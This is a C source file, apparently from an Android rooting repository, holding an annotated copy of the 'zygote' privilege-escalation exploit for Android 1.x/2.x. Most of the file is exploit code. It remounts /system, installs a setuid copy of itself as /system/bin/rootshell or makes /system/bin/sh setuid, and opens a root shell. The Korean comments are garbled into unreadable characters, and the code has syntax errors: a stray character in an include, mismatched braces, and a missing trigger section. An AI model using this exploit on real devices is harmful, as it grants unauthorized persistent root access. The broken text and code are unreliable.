https://raw.githubusercontent.com/mobilesec/android-gainroot/master/exploits/exploit3_zygote.c

/* Android 1.x/2.x zygote exploit (C) 2009-2010 The Android Exploid Crew */

//
�ȵ���̵� 1.x. 2.x �ͽ��÷��� �ڵ��Դϴ�.
����� �߻� ������ exe�ε� �ڵ� ���̳ʸ��� /system/bin/rootshell�� �����ؼ� 
������Ʈ ��ų �� ����Ǵ� ���� �ý��� ������ ���������ν� ������Ʈ��
��Ʈ���� ȹ��Ǵ� ������ ������ ���Կ� ���� ���Դϴ�.

--
��:
zygote�� /system�� ������Ʈ�ϰ�, exe(���ڵ�)�� /system/bin/rootshell�� �����ؼ� 
���� ��µ� �������� /system/bin/rootshell�� chmod�� 4755�� �����ؼ� �����ؼ� ���� 
��� ���� �����ϴ� �����׿�. ������Ʈ�� �� zygote ������ �ش� ������ �۹̼��� �� �� �ִ� 
������ ���� �߻��ϴ� ������Դϴ�.
--


�ʹ� ��ưԸ� �����Ͻ��� ���ð�, ���� �Ѿ�ŵ� �� �� ���׿�.
������ ���� ���ø� �� �� ������ ���� �� �� �ְڳ׿�.

��� ���� �ϰ�:
(1) /proc/self/exe ������ /system/bin/rootshell�� �����ؼ� ���� �ý����� ������Ʈ�ؼ� ���� ��� �� �ִ� ���Ե� ����.


#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>1
#include <errno.h>
#include <sys/types.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/mount.h>

// ȯ�� ���� ������ ����.
extern char **environ;

// ���μ��� ���� �Լ� ����.
void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


// ���� ���� �Լ� (copy from to to).
int copy(const char *from, const char *to)
{
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	// fd1 = �б����� ���Ϸ� �б�
                // fd2 = ���� ������ ���a.
	if ((fd1 = open(from, O_RDONLY)) < 0)
		return -1;
	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf)); // ������ �о �� �о����� �ڵ� �극��ũ.
		if (r <= 0)
			break;
		if (write(fd2, buf, r) != r) // �о����°� ������ buf ����(���� ����)�� fd2(������ ���Ͽ� ���� �� �ڵ� �극��ũ.
			break;
	}

	close(fd1);
	close(fd2);
	sync(); sync();
	return r;
}


// ��Ʈ�� ���� �Լ�. uid�� 2000(AID_SHELL)�� �ƴ� ��� setuid(0), setgid(0) �����ؼ� /system/bin/sh�� ��� ��Ʈ ���� ȹ�� �ϴ� �Լ�.
void rootshell(char **env)
{
	char *sh[] = {"/system/bin/sh", 0};

	// AID_SHELL
	if (getuid() != 2000)
		die("[-] Permission denied.");

	setuid(0); setgid(0);
	execve(*sh, sh, env);
	die("[-] execve");
}


// �ý��� ������Ʈ �Լ�.
// �Ʒ� �Լ�ó�� �縶��Ʈ�� �ϴ� ��쿡 ��Ʈ���� ȹ��Ǵ� �Լ��Դϴ�.
int remount_system(const char *mntpoint)
{
	FILE *f = NULL;
	int found = 0;
	char buf[1024], *dev = NULL, *fstype = NULL;

	// /proc/mounts�� �б� �������� ����.
	if ((f = fopen("/proc/mounts", "r")) == NULL)
		return -1;

	// ���� �ʱ�ȭ.
	memset(buf, 0, sizeof(buf));

	// ���� ������ �ݺ�.
	for (;!feof(f);) 
		if (fgets(buf, sizeof(buf), f) == NULL) // ���� �а� �ڵ� �극��ũ.
			break;
		if (strstr(buf, mntpoint)) { // ����Ʈ ����Ʈ�� ������ found = 1 ������ �ڵ� �극��ũ.
			found = 1;
			break;
		}
	}
	fclose(f);

               // ����Ʈ ������ ���� ��.
               // \t �� �������� ���ڿ��� �߶� dev, fstype �� ������ �ش��ϴ� ������ ���ؼ� ����.
	if (!found)
		return -1;
	if ((dev = strtok(buf, " \t")) == NULL) // dev ����.
		return -1;
	if (strtok(NULL, " \t") == NULL) // �߰� ���� �� ����.
		return -1;
	if ((fstype = strtok(NULL, " \t")) == NULL) // fstype ����.
		return -1;

                // ������Ʈ. (dev ���� ����̽�)
	return mount(dev, mntpoint, fstype, MS_REMOUNT, 0); // MS_REMOUNT �ɼ����� �縶��Ʈ. (��Ʈ�� ȹ��).
}

// ��Ʈ�� �����ϴ� ����� Ʈ���� �Լ�.
// �Ʒ� �ڵ带 �м��ϸ� ����� �߻� ������ �� �� �ִ�.
// ���� �ð����� �̷�.

void root()
{
	int i = 0, me = getpid(), fd = -1;
	char buf[256];

	for (i = 0; i < me; ++i) {
		snprintf(buf, sizeof(buf), "/proc/%d/status", i);
		if ((fd = open(buf, O_RDONLY)) < 0)
			continue;
		memset(buf, 0, sizeof(buf));
		if (read(fd, buf, 42) < 0)
			continue;
		if (strstr(buf, "libjailbreak.so"))
			kill(i, SIGKILL);
		close(fd);
	}

	remount_system("/system"); // /system ���丮�� ������Ʈ.
	if (copy("/proc/self/exe", "/system/bin/rootshell") != 0) // /proc/self/exe(���� �ͽ��÷��� ���̳ʸ�)�� /system/bin/rootshell�� ����.
		chmod("/system/bin/sh", 04755); // ���簡 �ȵǸ� /system/bin/sh�� 4755�� ����.
	else
		chmod("/system/bin/rootshell", 04711); // ���簡 �����̸� /system/bin/rootshell�� 4711�� ����. (���� �ڵ� �� ����� ��Ʈ���� �����).
	exit(0);
}


// ���� ��Ʈ�� �Լ�:
int main()
{
	pid_t p;

                // AID_SHELL ������ �ƴϾ setuid, setgid�� 0 ���� �Ǹ�
                // getuid, geteuid �� 0 (���� ����)�� �о����� rootshell(environ) �� ���� ��Ʈ�� ȹ��.
	if (getuid() && geteuid() == 0)
		rootshell(environ);
	else if (geteuid() == 0) // euid�� 0�̸� root �Լ� ȣ��.
		root();

	if (fork() > 0) { // ���μ��� 1�� ����.
		exit(0); // ����.
	}

                // sid(���� �ĺ���) ����.
	setsid();

	}

	return 0;
}



